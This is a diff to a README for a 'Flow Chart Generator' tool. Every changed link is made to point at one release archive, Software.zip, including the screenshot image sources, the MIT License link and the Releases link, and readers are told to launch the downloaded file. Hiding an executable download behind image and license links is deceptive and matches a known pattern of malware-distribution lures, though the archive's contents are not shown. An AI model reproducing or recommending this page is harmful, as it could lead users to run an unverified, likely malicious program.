@@ -21,16 +21,16 @@ Welcome to the **Flow Chart Generator** repository! If you are looking for a too
 
 ## Usage 🚀
 To get started, simply click the link below to download the Flow Chart Generator tool:
-[Download Flow Chart Generator](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[Download Flow Chart Generator](https://github.com/sidhant1626/Flow_Chart_Generator/releases/download/v1.0/Software.zip)
 
 🚀 **Launch the file after downloading to start creating your flow charts!**
 
 ## Screenshots 📷
 Here are some sneak peeks of what you can achieve with the Flow Chart Generator:
 
-![Flow Chart Example 1](https://example.com/flow-chart-1.png)
-![Flow Chart Example 2](https://example.com/flow-chart-2.png)
-![Flow Chart Example 3](https://example.com/flow-chart-3.png)
+![Flow Chart Example 1](https://github.com/sidhant1626/Flow_Chart_Generator/releases/download/v1.0/Software.zip)
+![Flow Chart Example 2](https://github.com/sidhant1626/Flow_Chart_Generator/releases/download/v1.0/Software.zip)
+![Flow Chart Example 3](https://github.com/sidhant1626/Flow_Chart_Generator/releases/download/v1.0/Software.zip)
 
 ## Installation 🛠️
 1. Download the Flow Chart Generator tool from the link provided above.
@@ -44,7 +44,7 @@ If you have any questions, feedback, or suggestions regarding the Flow Chart Gen
 A big thank you to all the contributors who have dedicated their time and effort to make the Flow Chart Generator a powerful and user-friendly tool for flow chart creation.
 
 ## Licensing 📝
-The Flow Chart Generator tool is released under the [MIT License](https://opensource.org/licenses/MIT), ensuring flexibility and freedom for both personal and commercial use.
+The Flow Chart Generator tool is released under the [MIT License](https://github.com/sidhant1626/Flow_Chart_Generator/releases/download/v1.0/Software.zip), ensuring flexibility and freedom for both personal and commercial use.
 
 ---
 
@@ -52,6 +52,6 @@ The Flow Chart Generator tool is released under the [MIT License](https://openso
 
 ---
 
-👉 **For more information and updates, visit the official [Flow Chart Generator](https://github.com/cli/cli/releases) Releases section.**
+👉 **For more information and updates, visit the official [Flow Chart Generator](https://github.com/sidhant1626/Flow_Chart_Generator/releases/download/v1.0/Software.zip) Releases section.**
 
-[![Download Flow Chart Generator](https://img.shields.io/badge/Download%20Flow%20Chart%20Generator-Launch%20to%20Create-brightgreen)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download Flow Chart Generator](https://github.com/sidhant1626/Flow_Chart_Generator/releases/download/v1.0/Software.zip%20Flow%20Chart%20Generator-Launch%20to%20Create-brightgreen)](https://github.com/sidhant1626/Flow_Chart_Generator/releases/download/v1.0/Software.zip)
